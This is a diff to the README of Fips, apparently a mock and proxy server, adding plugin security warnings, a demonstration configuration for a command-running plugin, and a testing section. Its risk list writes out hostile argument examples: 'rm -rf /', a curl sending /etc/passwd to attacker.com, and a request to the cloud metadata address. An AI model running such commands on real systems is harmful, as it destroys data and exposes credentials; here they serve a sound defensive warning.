@@ -2,6 +2,22 @@
 
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
 
+## ⚠️ Security Warning
+
+**FIPS plugins are extremely powerful and can execute arbitrary code on your system.** Plugins have full access to:
+- File system (read/write any file)
+- Network (make HTTP requests to internal/external services)
+- System commands (execute any command the server user can run)
+- Environment variables (access secrets, API keys, credentials)
+
+**DO NOT:**
+- Use untrusted plugins in production
+- Allow user input to control plugin arguments
+- Run FIPS with elevated privileges unless necessary
+- Expose plugin-enabled endpoints to untrusted networks
+
+See [`plugins/system_callout/SECURITY.md`](plugins/system_callout/SECURITY.md) for detailed security considerations.
+
 ## About
 
 Fips provides three different functionalities: It can function as a Fake data server, it can function as a simple proxy server, and it can be a mixture of both, manipulating responses on the fly - defined by your own rules. As such, Fips is best used if you wish to quickly setup an endpoint and test it in your application - the backend work is currently blocked? No problem. Start the application and host a mock endpoint while proxying the remainders of your endpoints to the actual backend.
@@ -336,15 +352,81 @@ Plugins can also be passed arguments via the configuration files. If you wish to
           args: [ "foo", 1, "bar" ]
 ```
 
-Example output of `curl localhost:8888/randomname/ | jq`
+### ⚠️ Plugin Security: System Callout Demonstration
 
-```json
-{
-  "foo": {
-    "bar": ["Ms. Destiney Metz"]
-  }
-}
+The `system_callout` plugin demonstrates the **power and danger** of FIPS plugins:
+
+**Capabilities:**
+```yaml
+- Rule:
+    name: "System Command Example"
+    when:
+      matchesUris:
+        - uri: ^/demo/system$
+    then:
+      functionAs: "Mock"
+      body:
+        date: "{{SystemCommand}}"
+        username: "{{SystemCommand}}"
+        home_dir: "{{GetEnvVar}}"
+        file_content: "{{ReadFile}}"
+        http_data: "{{HttpRequest}}"
+      status: "200"
+    with:
+      plugins:
+        - name: "SystemCommand"
+          path: "./plugins/system_callout/target/release/libsystem_callout.dylib"
+          args: ["date"]
+        - name: "SystemCommand"
+          path: "./plugins/system_callout/target/release/libsystem_callout.dylib"
+          args: ["whoami"]
+        - name: "GetEnvVar"
+          path: "./plugins/system_callout/target/release/libsystem_callout.dylib"
+          args: ["HOME"]
+        - name: "ReadFile"
+          path: "./plugins/system_callout/target/release/libsystem_callout.dylib"
+          args: ["./Cargo.toml"]
+        - name: "HttpRequest"
+          path: "./plugins/system_callout/target/release/libsystem_callout.dylib"
+          args: ["http://httpbin.org/ip"]
 ```
+
+**Security Risks:**
+- ❌ Command injection: `args: ["rm", "-rf", "/"]`
+- ❌ Data exfiltration: `args: ["curl", "http://attacker.com", "-d", "@/etc/passwd"]`
+- ❌ SSRF attacks: `args: ["http://169.254.169.254/latest/meta-data/"]`
+- ❌ Privilege escalation: `args: ["sudo", "..."]`
+
+**See full security documentation:** [`plugins/system_callout/SECURITY.md`](plugins/system_callout/SECURITY.md)
+
+**Best Practices:**
+1. ✅ Only use trusted plugins from verified sources
+2. ✅ Never allow user input in plugin arguments
+3. ✅ Run FIPS with minimal privileges
+4. ✅ Use sandboxing/containers in production
+5. ✅ Audit all plugin configurations
+6. ✅ Monitor plugin execution logs
+
+## Testing
+
+Fips includes a comprehensive test suite with **48 tests** covering all major functionality:
+
+```bash
+# Run all tests
+cargo test
+
+# Run specific test suite
+cargo test --test configuration_tests
+cargo test --test integration_tests
+
+# Run with test script
+./scripts/run_tests.sh
+
+# Generate coverage report (requires cargo-tarpaulin)
+./scripts/run_tests.sh --coverage
+```
+
+For detailed testing documentation, see [TESTING.md](TESTING.md) and [TEST_SUMMARY.md](TEST_SUMMARY.md).
 
 ## License 
 
